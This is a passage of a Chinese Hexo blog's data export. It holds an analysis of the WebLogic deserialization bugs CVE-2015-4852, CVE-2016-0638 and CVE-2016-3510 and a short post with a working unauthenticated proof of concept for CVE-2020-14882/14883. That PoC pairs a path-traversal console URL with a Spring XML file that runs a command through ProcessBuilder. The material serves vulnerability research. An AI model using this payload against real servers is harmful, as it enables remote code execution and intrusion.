class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> Class <span class=\"title\">resolveClass</span><span class=\"params\">(ObjectStreamClass var1)</span> <span class=\"keyword\">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class=\"line\">    Class var2 = <span class=\"keyword\">super</span>.resolveClass(var1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (var2 == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ClassNotFoundException(<span class=\"string\">&quot;super.resolveClass returns null.&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ObjectStreamClass var3 = ObjectStreamClass.lookup(var2);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var3 != <span class=\"keyword\">null</span> &amp;&amp; var3.getSerialVersionUID() != var1.getSerialVersionUID()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ClassNotFoundException(<span class=\"string\">&quot;different serialVersionUID. local: &quot;</span> + var3.getSerialVersionUID() + <span class=\"string\">&quot; remote: &quot;</span> + var1.getSerialVersionUID());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> var2;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>程序通过Class var2 = super.resolveClass(var1); 从ObjectStreamClass var1中获取到对应的类对象，并赋值给var2，最终通过执行return var2，将var1序列化描述符所对应的Class对象返回</p>\n<p>我们以熟悉的CVE-2015-4852利用链为例，动态调试一下resolveClass方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155521-c3a488ae-1829-1.png\" alt=\"b35be97a6451bd74a8868173bdd629d0.png\"></p>\n<p>可见resolveClass方法成功从序列化描述符中获取到”sun.reflect.annotation.AnnotationInvocationHandler”类对象，并将其返回</p>\n<p>到目前为止，我们已经搞明白了weblogic如何将流量中的类字节流转变为对应的Class对象。以上这部分知识，有助于我们理解Weblogic官方的修复方案。而接下来我们要谈论的是在Weblogic获得到Class对象后要做的事情，通过对这部分流程的理解，将会帮助你很轻松的理解为什么CVE-2015-4852、CVE-2016-0638、CVE-2016-3510的poc是如何奏效的。</p>\n<h2 id=\"从Class对象到代码执行\"><a href=\"#从Class对象到代码执行\" class=\"headerlink\" title=\"从Class对象到代码执行\"></a>从Class对象到代码执行</h2><p>通过上文的介绍可知，程序通过resolveClass获取Class对象，在resolveClass方法将获取到的Class对象返回后，上一级的readNonProxyDesc在接收到resolveClass方法返回值后，连同之前从流量中获取类的序列化描述符ObjectStreamClass一并，初始化并构建一个新的ObjectStreamClass，这个流程如下：</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20201029110755721.png\" alt=\"image-20201029110755721\"></p>\n<p>关键部分代码如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> ObjectStreamClass <span class=\"title\">readNonProxyDesc</span><span class=\"params\">(<span class=\"keyword\">boolean</span> unshared)</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">throws</span> IOException </span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">ObjectStreamClass desc = <span class=\"keyword\">new</span> ObjectStreamClass();</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">ObjectStreamClass readDesc = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\">    readDesc = readClassDescriptor();</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">Class cl = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((cl = resolveClass(readDesc)) == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">   resolveEx = <span class=\"keyword\">new</span> ClassNotFoundException(<span class=\"string\">&quot;null class&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br><span class=\"line\">desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class=\"keyword\">false</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">return</span> desc;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>结合流程图与代码来看，readNonProxyDesc方法中主要做了如下这些事情</p>\n<p>1、通过readClassDescriptor()方法从流量中获取序列化类的ObjectStreamClass并赋值给readDesc变量</p>\n<p>2、将readDesc传入resolveClass，获取该类的Class对象并赋值给cl变量</p>\n<p>3、将该类的ObjectStreamClass与Class对象传入initNonProxy方法，初始化一个ObjectStreamClass并赋值给desc变量</p>\n<p>4、将desc变量返回</p>\n<p>readNonProxyDesc方法中返回的ObjectStreamClass类型的desc变量，将会传递给readClassDesc，进而被readClassDesc传递给readOrdinaryObject</p>\n<p>readOrdinaryObject、readClassDesc与readNonProxyDesc的调用关系如下：</p>\n<p>readOrdinaryObject中调用readClassDesc:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> Object <span class=\"title\">readOrdinaryObject</span><span class=\"params\">(<span class=\"keyword\">boolean</span> unshared)</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">throws</span> IOException </span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">ObjectStreamClass desc = readClassDesc(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n\n\n<p>readClassDesc中调用readNonProxyDesc:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> ObjectStreamClass <span class=\"title\">readClassDesc</span><span class=\"params\">(<span class=\"keyword\">boolean</span> unshared)</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">throws</span> IOException </span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">byte</span> tc = bin.peekByte();</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (tc) &#123;</span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_CLASSDESC:</span><br><span class=\"line\">   <span class=\"keyword\">return</span> readNonProxyDesc(unshared);</span><br></pre></td></tr></table></figure>\n\n\n\n<p>因此，当readNonProxyDesc中ObjectStreamClass类型的desc变量返回后，途径readClassDesc方法的最终传递给readOrdinaryObject中的desc变量</p>\n<p>接下来看看readOrdinaryObject方法中部分片段</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ObjectStreamClass desc = readClassDesc(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">...</span><br><span class=\"line\">    obj = desc.isInstantiable() ? desc.newInstance() : <span class=\"keyword\">null</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">if</span> (desc.isExternalizable()) &#123;</span><br><span class=\"line\">    readExternalData((Externalizable) obj, desc);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    readSerialData(obj, desc);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">handles.finish(passHandle);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (obj != <span class=\"keyword\">null</span> &amp;&amp; </span><br><span class=\"line\">    handles.lookupException(passHandle) == <span class=\"keyword\">null</span> &amp;&amp;</span><br><span class=\"line\">    desc.hasReadResolveMethod())</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Object rep = desc.invokeReadResolve(obj);</span><br></pre></td></tr></table></figure>\n\n<p>上述代码中的第一行：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ObjectStreamClass desc = readClassDesc(<span class=\"keyword\">false</span>);</span><br></pre></td></tr></table></figure>\n\n<p>代码中由readClassDesc(false)执行得到的desc，即是readNonProxyDesc中获取并返回的ObjectStreamClass类型的desc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">obj = desc.isInstantiable() ? desc.newInstance() : <span class=\"keyword\">null</span>;</span><br></pre></td></tr></table></figure>\n\n<p>代码中接下来的条件分支，即是在获取了ObjectStreamClass类型的desc后，readOrdinaryObject接着尝试调用类对象中的readObject、readResolve、readExternal等方法。</p>\n<p>关于readObject、readResolve、readExternal等方法的调用，将其整理成流程图，有助于对其更好的理解，流程图如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155537-cca7961c-1829-1.png\" alt=\"54e51374e255a9c4b137acc1d0cbd56c.png\"></p>\n<p>在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法。</p>\n<p>在这里提前透露下，CVE-2015-4852、CVE-2016-0638、CVE-2016-3510这三个漏洞，所利用的恰好依次是恶意类”sun.reflect.annotation.AnnotationInvocationHandler”中的readObject、”weblogic.jms.common.StreamMessageImpl”中的readExternal、以及”weblogic.corba.utils.MarshalledObject”中的readResolve方法</p>\n<p>试想一下这个场景：在没有任何防护或防护不当的时候，攻击者通过流量中传入恶意类的序列化数据，weblogic将流量中的序列化数据还原为其对应的Class对象，并尝试执行恶意类中的readObject、readResolve、readExternal等方法。这就是CVE-2015-4852、CVE-2016-0638、CVE-2016-3510漏洞的核心。</p>\n<h2 id=\"CVE-2015-4852\"><a href=\"#CVE-2015-4852\" class=\"headerlink\" title=\"CVE-2015-4852\"></a>CVE-2015-4852</h2><p>在分析过流程之后，这个漏洞呼之欲出。简单来说，在CVE-2015-4852漏洞爆发之前，weblogic对流量中的序列化数据没有任何的校验，长驱直入的恶意数据最终被还原出其Class对象，并被Weblogic调用了其Class对象中的readObject方法，结合CVE-2015-4852细节来说就是：</p>\n<ol>\n<li><p>精心构造的ChainedTransformer恶意链（以下简称恶意数据）</p>\n</li>\n<li><p>将构造好的恶意数据包裹在AnnotationInvocationHandler类的memberValues变量中</p>\n</li>\n<li><p>在流量中构造并传入上述制作好的AnnotationInvocationHandler类的序列化数据</p>\n</li>\n<li><p>Weblogic获取AnnotationInvocationHandler类的Class对象</p>\n</li>\n<li><p>Weblogic尝试调用AnnotationInvocationHandler类的readObject方法</p>\n</li>\n<li><p>AnnotationInvocationHandler类中readObject中存在一些有助于漏洞利用的操作（AnnotationInvocationHandler的readObject方法中对其memberValues的每一项调用了setValue方法进而调用了checkSetValue）</p>\n</li>\n<li><p>恶意数据存放在memberValues中伺机而动。恶意数据的原理我们就不细说了，简单来说就是，当恶意数据的checkSetValue被触发，就能造成命令执行</p>\n</li>\n<li><p>等到readObject方法对memberValues的每一项调用setValue方法执行时，setValue方法会进而调用并触发恶意数据的checkSetValue，造成命令执行</p>\n</li>\n</ol>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155550-d4cf730a-1829-1.png\" alt=\"e92fbde69bafb5ac777da44e96bd9d9a.png\"></p>\n<h2 id=\"Weblogic的防护机制\"><a href=\"#Weblogic的防护机制\" class=\"headerlink\" title=\"Weblogic的防护机制\"></a>Weblogic的防护机制</h2><p>CVE-2015-4852这个漏洞利用出现之后，官方对Weblogic进行了一些改造，增加了一些安全防护。至于怎么防护，说起来很简单，以普通类为例，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155559-da0eb3b2-1829-1.png\" alt=\"10b6817babd9d985caefe76cc0623ac0.png\"></p>\n<p>resolveClass方法的作用是从类序列化描述符获取类的Class对象，在resolveClass中增加一个检查，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样以来，恶意类连生成Class对象的机会都没有，更何况要执行恶意类中的<br>readObject、readResolve、readExternal呢。</p>\n<p>我们看一下具体是怎么实现的，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155626-e9e7005a-1829-1.png\" alt=\"b95c0a9e24b511213e076e61a069e12f.png\"></p>\n<p>可见更新之后多出了一个if条件分支，通过isBlackListed校验传入的类名用来处理代理类的resolveProxyClass也是一样的方式，不再复述。</p>\n<p>从整体上来看，检查模块主要在下图红框里</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155635-ef801b3c-1829-1.png\" alt=\"898634e47e18bace15c0cbba196c9b31.png\"></p>\n<p>在修复过后，CVE-2015-4852已经不能成功利用了：CVE-2015-4852所使用到的AnnotationInvocationHandler在黑名单中，会直接报错而不能获取其Class对象，更不能执行其中的readObject。</p>\n<h2 id=\"CVE-2016-0638\"><a href=\"#CVE-2016-0638\" class=\"headerlink\" title=\"CVE-2016-0638\"></a>CVE-2016-0638</h2><p>这个漏洞主要是找到了个黑名单之外的类”weblogic.jms.common.StreamMessageImpl”</p>\n<p>简单来说，由于黑名单的限制，CVE-2015-4852利用链没法直接使用，这个漏洞像是整了个套娃，给CVE-2015-4852装进去了。</p>\n<p>为什么使用StreamMessageImpl这个类呢？其实原理也很简单。StreamMessageImpl类中的readExternal方法可以接收序列化数据作为参数，而当StreamMessageImpl类的readExternal执行时，会反序列化传入的参数并执行该参数反序列化后对应类的readObject方法。我们动态调试一下，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155645-f52e107a-1829-1.png\" alt=\"362088fdc6055340600570c83c08993f.png\"></p>\n<p>如果我们把序列化后的CVE-2015-4852利用链序列化之后丢进readExternal呢？</p>\n<p>当我们给上图StreamMessageImpl类的readExternal中传入序列化后的CVE-2015-4852利用链，在readExternal被执行时，会将CVE-2015-4852利用链数据反序列化，并在上图864行处调用其readObject方法，也就是AnnotationInvocationHandler的readObject方法</p>\n<p>好了，AnnotationInvocationHandler的readObject方法被调用了，CVE-2015-4852复活了。</p>\n<p>但是StreamMessageImpl类的readExternal要怎么被执行呢?别忘了上文分析的Weblogic反序列化流程，在获取到StreamMessageImpl类的Class对象后，程序可不止调用其readObject方法，还会尝试调用readExternal的。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155655-fb5f308c-1829-1.png\" alt=\"9ce6bbce5fae485feaa76654ff515c80.png\"></p>\n<h2 id=\"CVE-2016-3510\"><a href=\"#CVE-2016-3510\" class=\"headerlink\" title=\"CVE-2016-3510\"></a>CVE-2016-3510</h2><p>这个漏洞与上一个几乎一致，也是做了个套娃给CVE-2015-4852利用链装进去了，从而绕过了黑名单限制。</p>\n<p>这次找到的是weblogic.corba.utils.MarshalledObject</p>\n<p>首先看一下这个类的构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MarshalledObject</span><span class=\"params\">(Object var1)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (var1 == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.hash = <span class=\"number\">13</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ByteArrayOutputStream var2 = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        MarshalledObject.MarshalledObjectOutputStream var3 = <span class=\"keyword\">new</span> MarshalledObject.MarshalledObjectOutputStream(var2);</span><br><span class=\"line\">        var3.writeObject(var1);</span><br><span class=\"line\">        var3.flush();</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.objBytes = var2.toByteArray();</span><br><span class=\"line\">        <span class=\"keyword\">int</span> var4 = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> var5 = <span class=\"number\">0</span>; var5 &lt; <span class=\"keyword\">this</span>.objBytes.length; ++var5) &#123;</span><br><span class=\"line\">            var4 = <span class=\"number\">31</span> * var4 + <span class=\"keyword\">this</span>.objBytes[var5];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.hash = var4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以发现，这个类的构造方法接收一个Object类型的参数var1，然后将传入的Object参数序列化后转换为byte数组的形式赋值给this.objBytes</p>\n<p>我们接下来看看MarshalledObject的readResolve方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">readResolve</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException, ObjectStreamException </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.objBytes == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ByteArrayInputStream var1 = <span class=\"keyword\">new</span> ByteArrayInputStream(<span class=\"keyword\">this</span>.objBytes);</span><br><span class=\"line\">        ObjectInputStream var2 = <span class=\"keyword\">new</span> ObjectInputStream(var1);</span><br><span class=\"line\">        Object var3 = var2.readObject();</span><br><span class=\"line\">        var2.close();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> var3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见，MarshalledObject的readResolve方法将this.objBytes反序列化，并执行其readObject。this.objBytes可以由MarshalledObject构造方法中传入的var参数控制</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155707-028637ca-182a-1.png\" alt=\"d47f1dff5b0fa0d58f49133ceba48d38.png\"></p>\n<p>这样以来，将CVE-2015-4852利用链传入MarshalledObject构造方法中，将MarshalledObject序列化后，则可以将CVE-2015-4852利用链保存在其this.objBytes变量中。当weblogic将构造好的MarshalledObject反序列化时，weblogic将尝试调用MarshalledObject的readResolve方法时，CVE-2015-4852利用链被执行</p>\n<p>如果对如何构造的poc细节不是很清楚，可以参照这个链接</p>\n<p><a href=\"https://github.com/zhzhdoai/Weblogic_Vuln/blob/master/Weblogic_Vuln/src/main/java/com/weblogcVul/CVE_2016_3510.java\">https://github.com/zhzhdoai/Weblogic_Vuln/blob/master/Weblogic_Vuln/src/main/java/com/weblogcVul/CVE_2016_3510.java</a></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>Weblogic的前三个反序列化漏洞并不复杂，但是对其的研究和分析是有一定的方式的，仅仅从单一的漏洞分析入手，很容易看不懂，反而把漏洞弄得复杂化。在了解了漏洞流程之后，再回头来看，这几个漏洞的原理便呼之欲出。</p>\n"},{"title":"CVE-2020-14882/14883 适用于Weblogic 10.3.6.0.0版本的poc","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5f5aed5480.jpg","date":"2020-10-30T09:08:28.000Z","_content":"\n目前网上给出的poc，适用于12版本Weblogic，但并不适用于10.3.6.0.0版本，因此这里给出一个适用于Weblogic 10.3.6.0.0版本的测试 poc\n\n\n\n无需登录Weblogic，访问如下链接：\n\nhttp://localhost:7001/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://127.0.0.1/poc_xml.xml\")\n\n\n\npoc_xml.xml内容如下：\n\n```xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans\nhttp://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n<bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n\n<constructor-arg value=\"calc.exe\" />\n\n</bean>\n\n</beans>\n```\n\n","source":"_posts/CVE-2020-14882.md","raw":"---\ntitle: CVE-2020-14882/14883 适用于Weblogic 10.3.6.0.0版本的poc\ntags: web漏洞分析\ncategories: 技术\ntop_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'\ncover: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5f5aed5480.jpg'\ndate: 2020-10-30 17:08:28\n---\n\n目前网上给出的poc，适用于12版本Weblogic，但并不适用于10.3.6.0.0版本，因此这里给出一个适用于Weblogic 10.3.6.0.0版本的测试 poc\n\n\n\n无需登录Weblogic，访问如下链接：\n\nhttp://localhost:7001/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://127.0.0.1/poc_xml.xml\")\n\n\n\npoc_xml.xml内容如下：\n\n```xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans\nhttp://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n<bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n\n<constructor-arg value=\"calc.exe\" />\n\n</bean>\n\n</beans>\n```\n\n","slug":"CVE-2020-14882","published":1,"updated":"2020-10-30T09:29:36.520Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckgw22dqk0000eca99cub1zmh","content":"<p>目前网上给出的poc，适用于12版本Weblogic，但并不适用于10.3.6.0.0版本，因此这里给出一个适用于Weblogic 10.3.6.0.0版本的测试 poc</p>\n<p>无需登录Weblogic，访问如下链接：</p>\n<p><a href=\"http://localhost:7001/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://127.0.0.1/poc_xml.xml&quot;)\">http://localhost:7001/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://127.0.0.1/poc_xml.xml&quot;)</a></p>\n<p>poc_xml.xml内容如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\"></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\"></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;pb&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;start&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;calc.exe&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<p>目前网上给出的poc，适用于12版本Weblogic，但并不适用于10.3.6.0.0版本，因此这里给出一个适用于Weblogic 10.3.6.0.0版本的测试 poc</p>\n<p>无需登录Weblogic，访问如下链接：</p>\n<p><a href=\"http://localhost:7001/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://127.0.0.1/poc_xml.xml&quot;)\">http://localhost:7001/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://127.0.0.1/poc_xml.xml&quot;)</a></p>\n<p>poc_xml.xml内容如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 